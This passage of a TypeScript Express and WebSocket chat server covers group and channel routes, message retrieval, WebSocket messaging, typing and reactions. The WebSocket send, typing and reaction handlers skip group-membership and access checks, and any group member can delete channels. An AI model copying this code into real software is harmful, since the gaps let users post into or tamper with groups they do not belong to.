    const groupId = req.params.id;
    const group = db.groups.find(g => g.id === groupId);

    if (!group) {
      return res.status(404).json({ error: 'Group not found' });
    }

    const isAdmin =
      Boolean(currentUser.isAdmin) ||
      group.createdBy === currentUser.id ||
      (group.adminIds && group.adminIds.includes(currentUser.id));

    if (!isAdmin) {
      return res.status(403).json({ error: 'Only the Group Admin has permission to delete this group.' });
    }

    const previousMemberIds = [...group.memberIds];

    // Remove group from database
    db.groups = db.groups.filter(g => g.id !== groupId);

    // Remove all messages belonging to this group
    db.messages = db.messages.filter(m => m.groupId !== groupId);

    saveDatabase();

    // Broadcast group deletion to all previous members
    broadcast({ type: 'group_deleted', groupId }, previousMemberIds);

    return res.json({ success: true, groupId });
  });

  // 11. Add channel to group
  app.post('/api/groups/:id/channels', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const groupId = req.params.id;
    const { name, description } = req.body;

    const group = db.groups.find(g => g.id === groupId);
    if (!group) {
      return res.status(404).json({ error: 'Group not found' });
    }
    if (!currentUser.isAdmin && !group.memberIds.includes(currentUser.id)) {
      return res.status(403).json({ error: 'You are not a member of this group' });
    }

    const cleanName = (name || '').trim().toLowerCase().replace(/\s+/g, '-').slice(0, 30);
    if (!cleanName) {
      return res.status(400).json({ error: 'Channel name is required' });
    }

    const newChannel: Channel = {
      id: 'ch_' + crypto.randomUUID(),
      name: cleanName,
      description: (description || '').trim().slice(0, 100),
      createdAt: Date.now(),
    };

    group.channels.push(newChannel);
    saveDatabase();
    broadcast({ type: 'group_updated', group });

    return res.status(201).json({ channel: newChannel, group });
  });

  // 11b. Delete channel from group
  app.delete('/api/groups/:id/channels/:channelId', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const groupId = req.params.id;
    const channelId = req.params.channelId;

    const group = db.groups.find(g => g.id === groupId);
    if (!group) {
      return res.status(404).json({ error: 'Group not found' });
    }

    const isGroupCreator = group.createdBy === currentUser.id;
    const isGroupAdmin = Array.isArray(group.adminIds) && group.adminIds.includes(currentUser.id);
    const isGlobalAdmin = Boolean(currentUser.isAdmin);
    const isGroupMember = Array.isArray(group.memberIds) && group.memberIds.includes(currentUser.id);

    if (!isGroupCreator && !isGroupAdmin && !isGlobalAdmin && !isGroupMember) {
      return res.status(403).json({ error: 'Only squad members or administrators can delete channels.' });
    }

    if (group.channels.length <= 1) {
      return res.status(400).json({ error: 'Cannot delete the only channel in a squad. Every squad must have at least one channel.' });
    }

    const channelIndex = group.channels.findIndex(c => c.id === channelId);
    if (channelIndex === -1) {
      return res.status(404).json({ error: 'Channel not found' });
    }

    const deletedChannel = group.channels[channelIndex];
    group.channels.splice(channelIndex, 1);

    // Remove all messages in this channel
    db.messages = db.messages.filter(m => !(m.groupId === groupId && m.channelId === channelId));

    saveDatabase();

    broadcast({
      type: 'channel_deleted',
      groupId,
      channelId,
      group,
      deletedChannelName: deletedChannel.name,
    });

    return res.json({ success: true, group, deletedChannelId: channelId });
  });

  // 12. Add friend to group directly
  app.post('/api/groups/:id/add-member', authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const groupId = req.params.id;
    const { userId } = req.body;

    const group = db.groups.find(g => g.id === groupId);
    if (!group) {
      return res.status(404).json({ error: 'Group not found' });
    }
    if (!currentUser.isAdmin && !group.memberIds.includes(currentUser.id)) {
      return res.status(403).json({ error: 'Only members can add friends to this group' });
    }

    const friend = db.users.find(u => u.id === userId);
    if (!friend) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!group.memberIds.includes(friend.id)) {
      group.memberIds.push(friend.id);

      const addMsg: Message = {
        id: 'msg_' + crypto.randomUUID(),
        groupId: group.id,
        channelId: group.channels[0]?.id || 'general',
        senderId: 'system',
        senderName: 'SquadBot',
        senderUsername: 'squadbot',
        senderAvatarColor: '#10b981',
        senderAvatarIcon: '✨',
        text: `✨ **${friend.displayName}** was invited to the group by **${currentUser.displayName}**!`,
        reactions: [{ emoji: '🎉', userIds: [currentUser.id] }],
        createdAt: Date.now(),
      };
      db.messages.push(addMsg);

      saveDatabase();
      broadcast({ type: 'group_updated', group });
      broadcast({ type: 'new_message', message: addMsg }, group.memberIds);
    }

    return res.json({ group });
  });

  // 13. Get messages for a group channel (with flexible fallback routes)
  app.get([
    '/api/groups/:groupId/channels/:channelId/messages',
    '/api/groups/:groupId/messages',
    '/api/groups/channels/messages',
    '/api/groups//channels//messages',
  ], authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { groupId, channelId } = req.params;

    if (!groupId || groupId === 'undefined' || groupId === 'null') {
      return res.json({ messages: [] });
    }

    const group = db.groups.find(g => g.id === groupId);
    if (!group) {
      return res.json({ messages: [] });
    }
    if (!currentUser.isAdmin && !group.memberIds.includes(currentUser.id)) {
      return res.status(403).json({ error: 'You are not a member of this group' });
    }

    const targetChannelId = channelId || group.channels[0]?.id || 'general';
    const channelMessages = db.messages
      .filter(m => m.groupId === groupId && (!channelId || m.channelId === targetChannelId))
      .slice(-100); // Last 100 messages

    return res.json({ messages: channelMessages });
  });

  // 14. Get Direct Messages between currentUser and friend (with flexible fallback routes)
  app.get([
    '/api/direct/:friendId/messages',
    '/api/direct/messages',
    '/api/direct//messages',
  ], authMiddleware, (req, res) => {
    const currentUser = (req as any).user as User;
    const { friendId } = req.params;

    if (!friendId || friendId === 'undefined' || friendId === 'null') {
      return res.json({ messages: [] });
    }

    const friend = db.users.find(u => u.id === friendId);
    if (!friend) {
      return res.json({ messages: [] });
    }

    const dmMessages = db.messages
      .filter(m => !m.groupId && (
        (m.senderId === currentUser.id && m.recipientId === friendId) ||
        (m.senderId === friendId && m.recipientId === currentUser.id)
      ))
      .slice(-100);

    return res.json({ messages: dmMessages });
  });

  // 14b. Generic message fallback
  app.get('/api/messages', authMiddleware, (_req, res) => {
    return res.json({ messages: [] });
  });

  // --- WebSocket Setup ---
  wss.on('connection', (ws: WebSocket) => {
    let authenticatedUser: User | null = null;

    ws.on('message', (rawData: string) => {
      try {
        const data = JSON.parse(rawData.toString());

        // Handle Authentication
        if (data.type === 'auth') {
          const { token } = data;
          const userId = db.tokens[token];
          if (userId) {
            const user = db.users.find(u => u.id === userId);
            if (user) {
              if (user.isBlocked) {
                ws.send(JSON.stringify({ type: 'account_blocked', message: 'Your account has been blocked by Administrator.' }));
                ws.close();
                return;
              }
              authenticatedUser = user;
              activeConnections.set(ws, { userId: user.id, username: user.username });

              // Confirm auth to client
              ws.send(JSON.stringify({
                type: 'auth_success',
                userId: user.id,
                onlineUsers: getOnlineUserIds(),
              }));

              // Broadcast user presence
              broadcast({
                type: 'user_presence',
                userId: user.id,
                status: 'online',
                onlineUsers: getOnlineUserIds(),
              });
            }
          }
          return;
        }

        if (!authenticatedUser) {
          ws.send(JSON.stringify({ type: 'error', message: 'Not authenticated' }));
          return;
        }

        // Handle Send Message
        if (data.type === 'send_message') {
          const { groupId, channelId, recipientId, text, mediaUrl, replyTo } = data;

          const cleanText = (text || '').trim().slice(0, 2000);
          const cleanMedia = (mediaUrl && typeof mediaUrl === 'string' && mediaUrl.trim()) ? mediaUrl.trim() : undefined;

          if (!cleanText && !cleanMedia) return;
          if (!groupId && (!recipientId || !recipientId.trim())) return;

          const newMessage: Message = {
            id: 'msg_' + crypto.randomUUID(),
            groupId: groupId || undefined,
            channelId: channelId || undefined,
            recipientId: (!groupId && recipientId && recipientId.trim()) ? recipientId.trim() : undefined,
            senderId: authenticatedUser.id,
            senderName: authenticatedUser.displayName,
            senderUsername: authenticatedUser.username,
            senderAvatarColor: authenticatedUser.avatarColor,
            senderAvatarIcon: authenticatedUser.avatarIcon,
            senderAvatarUrl: authenticatedUser.avatarUrl,
            text: cleanText,
            mediaUrl: cleanMedia,
            replyTo: replyTo ? {
              id: replyTo.id,
              senderName: replyTo.senderName,
              text: replyTo.text.slice(0, 100),
            } : undefined,
            reactions: [],
            createdAt: Date.now(),
          };

          db.messages.push(newMessage);
          saveDatabase();

          if (groupId) {
            const group = db.groups.find(g => g.id === groupId);
            if (group) {
              broadcast({ type: 'new_message', message: newMessage }, group.memberIds);
            }
          } else if (newMessage.recipientId) {
            // Direct message: broadcast to recipient and sender
            broadcast({ type: 'new_message', message: newMessage }, [newMessage.recipientId, authenticatedUser.id]);
          }
          return;
        }

        // Handle Typing indicator
        if (data.type === 'typing') {
          const { groupId, channelId, recipientId, isTyping } = data;
          const typingEvent = {
            type: 'user_typing',
            userId: authenticatedUser.id,
            userName: authenticatedUser.displayName,
            groupId,
            channelId,
            recipientId,
            isTyping,
          };

          if (groupId) {
            const group = db.groups.find(g => g.id === groupId);
            if (group) {
              const otherMembers = group.memberIds.filter(id => id !== authenticatedUser?.id);
              broadcast(typingEvent, otherMembers);
            }
          } else if (recipientId) {
            broadcast(typingEvent, [recipientId]);
          }
          return;
        }

        // Handle Emoji Reaction
        if (data.type === 'react_message') {
          const { messageId, emoji } = data;
          const message = db.messages.find(m => m.id === messageId);
          if (!message || !emoji) return;

          let reaction = message.reactions.find(r => r.emoji === emoji);
          if (reaction) {
            if (reaction.userIds.includes(authenticatedUser.id)) {
              // Remove reaction
              reaction.userIds = reaction.userIds.filter(id => id !== authenticatedUser?.id);
              if (reaction.userIds.length === 0) {
                message.reactions = message.reactions.filter(r => r.emoji !== emoji);
              }
            } else {
              // Add reaction
              reaction.userIds.push(authenticatedUser.id);
            }
          } else {
            message.reactions.push({ emoji, userIds: [authenticatedUser.id] });
          }

          saveDatabase();

          const updateEvent = {
            type: 'message_reaction_updated',
            messageId,
            reactions: message.reactions,
          };

          if (message.groupId) {
            const group = db.groups.find(g => g.id === message.groupId);
            if (group) {
              broadcast(updateEvent, group.memberIds);
            }
          } else if (message.recipientId) {
            broadcast(updateEvent, [message.recipientId, message.senderId]);
          }
          return;
        }

        // Ping / Heartbeat
        if (data.type === 'ping') {
          ws.send(JSON.stringify({ type: 'pong' }));
        }

      } catch (err) {
        console.error('WebSocket message parsing error:', err);
      }
    });

    ws.on('close', () => {
      if (authenticatedUser) {
        const closedUserId = authenticatedUser.id;
        activeConnections.delete(ws);
        const isStillConnected = Array.from(activeConnections.values()).some(info => info.userId === closedUserId);
        if (!isStillConnected) {
          broadcast({
            type: 'user_presence',
            userId: closedUserId,
            status: 'offline',
            onlineUsers: getOnlineUserIds(),
          });
        }
      }
    });
  });

  // 404 handler for unmatched /api routes so they return JSON instead of falling through to Vite SPA index.html
  app.all('/api/*', (_req, res) => {
    return res.status(404).json({ error: 'API route not found' });
  });

  // Setup Vite dev middleware or static serving
  const isDev = process.env.NODE_ENV !== 'production';

  if (isDev) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const PORT = Number(process.env.PORT) || 3000;
  server.listen(PORT, '0.0.0.0', () => {
    console.log(`KirraK MuchatlU server running on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch(err => {
  console.error('Server startup failed:', err);
  process.exit(1);
});
